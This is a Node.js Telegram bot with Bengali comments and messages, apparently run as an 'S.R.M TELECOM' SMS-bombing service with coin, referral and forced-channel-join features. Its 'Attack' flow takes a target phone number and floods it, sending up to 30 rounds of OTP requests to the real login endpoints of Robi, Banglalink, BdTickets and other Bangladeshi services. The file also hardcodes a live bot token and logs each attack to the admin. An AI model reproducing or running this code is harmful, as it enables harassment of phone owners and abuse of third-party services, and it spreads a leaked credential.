const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; 
const channelId = '@srmtelecom'; 
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস (ইউজার ডাটা ও ব্যান লিস্ট)
const dbFile = 'users.json';
let users = {};
if (fs.existsSync(dbFile)) { 
    try { users = JSON.parse(fs.readFileSync(dbFile)); } catch (e) { users = {}; }
}
function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }

// Render সচল রাখতে (Uptime)
http.createServer((req, res) => { res.write("S.R.M Master Engine Online!"); res.end(); }).listen(process.env.PORT || 3000);

const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 শুরু করুন (Attack)' }, { text: '👤 প্রোফাইল ও ব্যালেন্স' }],
            [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
            [{ text: '📢 অফিশিয়াল চ্যানেল' }]
        ],
        resize_keyboard: true
    }
};

async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();
    if (!text) return;

    // ১. ইউজার রেজিস্ট্রেশন ও ব্যান চেক
    if (!users[userId]) {
        users[userId] = { balance: 0, lastBonus: 0, step: '', name: msg.from.first_name || "User", isBanned: false };
        if (text.startsWith('/start ') && text.split(' ')[1] !== userId) {
            const refId = text.split(' ')[1];
            if (users[refId]) { users[refId].balance += 1; bot.sendMessage(refId, `🎊 অভিনন্দন! আপনার রেফারে একজন জয়েন করায় আপনি **১ কয়েন** পেয়েছেন।`); }
        }
        saveDB();
    }

    if (users[userId].isBanned) {
        return bot.sendMessage(chatId, "🚫 **দুঃখিত!** আপনাকে এই বট থেকে ব্যান করা হয়েছে। অ্যাডমিনের সাথে যোগাযোগ করুন।");
    }

    // ২. ফোর্স জয়েন
    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start' && !text.startsWith('/start')) {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\nবটটি ব্যবহার করতে আমাদের চ্যানেলে জয়েন করুন।\n📢 লিংক: ${channelLink}\n\nজয়েন করে আবার /start দিন।`);
    }

    // ৩. অ্যাডমিন কন্ট্রোল (Add, Ban, Unban, UserList)
    if (userId === adminId) {
        if (text.startsWith('add ')) {
            const [_, targetId, amount] = text.split(' ');
            if (users[targetId]) { users[targetId].balance += parseInt(amount); saveDB(); bot.sendMessage(chatId, `✅ সফল! ID: ${targetId}-এ ${amount} কয়েন দেওয়া হয়েছে।`); }
            return;
        }
        if (text.startsWith('/ban ')) {
            const targetId = text.split(' ')[1];
            if (users[targetId]) { users[targetId].isBanned = true; saveDB(); bot.sendMessage(chatId, `🚫 User ${targetId} কে ব্যান করা হয়েছে।`); }
            return;
        }
        if (text.startsWith('/unban ')) {
            const targetId = text.split(' ')[1];
            if (users[targetId]) { users[targetId].isBanned = false; saveDB(); bot.sendMessage(chatId, `✅ User ${targetId} কে আনব্যান করা হয়েছে।`); }
            return;
        }
        if (text === '/userlist') {
            let listMsg = `📊 **S.R.M User List**\n━━━━━━━━━━━━━━\n`;
            Object.keys(users).forEach((id, index) => {
                listMsg += `${index + 1}. ${users[id].name} (\`${id}\`) - 💰 ${users[id].balance} - ${users[id].isBanned ? '🚫 Banned' : '✅ Active'}\n`;
            });
            return bot.sendMessage(chatId, listMsg, { parse_mode: "Markdown" });
        }
    }

    // ৪. মেইন ফাংশনস
    if (text === '/start' || text.startsWith('/start')) {
        const welcome = `⚡ **S.R.M TELECOM** 👋\n━━━━━━━━━━━━━━\n💰 ব্যালেন্স: **${users[userId].balance} Coins**\n🔥 হাই-স্পিড ওটিপি সার্ভার এখন অনলাইন!`;
        return bot.sendMessage(chatId, welcome, { parse_mode: "Markdown", ...mainMenu });
    }

    if (text === '👤 প্রোফাইল ও ব্যালেন্স') {
        const bal = (userId === adminId) ? "Unlimited ♾" : users[userId].balance;
        return bot.sendMessage(chatId, `👤 **নাম:** ${users[userId].name}\n🆔 **আইডি:** \`${userId}\`\n💰 **কয়েন:** ${bal}`, { parse_mode: "Markdown" });
    }

    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        if (now - users[userId].lastBonus < 86400000) return bot.sendMessage(chatId, "⏳ ২৪ ঘণ্টা পর আবার ট্রাই করুন।");
        users[userId].balance += 2; users[userId].lastBonus = now; saveDB();
        return bot.sendMessage(chatId, "✅ অভিনন্দন! আপনি **২ কয়েন** ফ্রি বোনাস পেয়েছেন।");
    }

    if (text === '🔗 রেফার করুন') {
        return bot.sendMessage(chatId, `🔗 **আপনার রেফার লিঙ্ক:**\nhttps://t.me/reffer_incomebdbot?start=${userId}\n\nপ্রতি রেফারে পাবেন **১ কয়েন**!`);
    }

    // ৫. অ্যাটাক ও অ্যাডমিন লগিং
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) return bot.sendMessage(chatId, "❌ কয়েন নেই! বোনাস নিন বা রেফার করুন।");
        users[userId].step = 'num'; saveDB();
        return bot.sendMessage(chatId, "📱 টার্গেট নম্বরটি দিন (১১ ডিজিট):", { reply_markup: { remove_keyboard: true } });
    }

    if (users[userId]?.step === 'num' && text.length === 11) {
        users[userId].target = text; users[userId].step = 'amount'; saveDB();
        return bot.sendMessage(chatId, "🔢 কয়টি SMS পাঠাতে চান? (১-৩০):");
    }

    if (users[userId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ সর্বোচ্চ ৩০টি সম্ভব।");
        const target = users[userId].target;
        if (userId !== adminId) users[userId].balance -= 1;
        users[userId].step = ''; saveDB();

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে অ্যাটাক শুরু হয়েছে...`, mainMenu);

        let success = 0; let fail = 0;
        
        for (let i = 0; i < amount; i++) {
            // Robi (Next.js Pro)
            try { await axios.post('https://www.robi.com.bd/api/v1/user/otp-login/request', [{"msisdn": target}], { headers: { 'Accept': 'text/x-component', 'next-action': '7f059ca75e4421bcef70abad89cb5bb05cba717c30', 'X-Requested-With': 'mark.via.gp' }, timeout: 4000 }); success++; } catch (e) { fail++; }

            // BdTickets (Original 20100)
            try { await axios.post('https://api.bdtickets.com:20100/v1/auth', { "createUserCheck": true, "phoneNumber": "+88" + target, "applicationChannel": "WEB_APP" }, { headers: { 'Content-Type': 'application/json;charset=UTF-8' }, timeout: 4000 }); success++; } catch (e) { fail++; }

            // Karigori (Options + Get)
            try { await axios.options(`https://api.karigoripathsala.com/api/get-otp?phone=${target}`); await axios.get(`https://api.karigoripathsala.com/api/get-otp?phone=${target}`); success++; } catch (e) { fail++; }

            // Iqra & Banglalink
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`); success++; } catch (e) { fail++; }
            try { await axios.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', { "mobile": target }); success++; } catch (e) { fail++; }

            await new Promise(r => setTimeout(r, 4500)); 
        }

        // ইউজারকে রেজাল্ট পাঠানো
        bot.sendMessage(chatId, `✅ **অ্যাটাক সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল: ${success} | ব্যর্থ: ${fail}`, mainMenu);

        // অ্যাডমিনকে লাইভ লগ পাঠানো (আপনি যা চেয়েছিলেন)
        const log = `⚠️ **LIVE ATTACK LOG**\n👤 User: ${users[userId].name} (\`${userId}\`)\n🎯 Target: \`${target}\`\n🔢 Requested: ${amount}\n✅ Success: ${success}\n❌ Failed: ${fail}`;
        bot.sendMessage(adminId, log, { parse_mode: "Markdown" });
    }
});
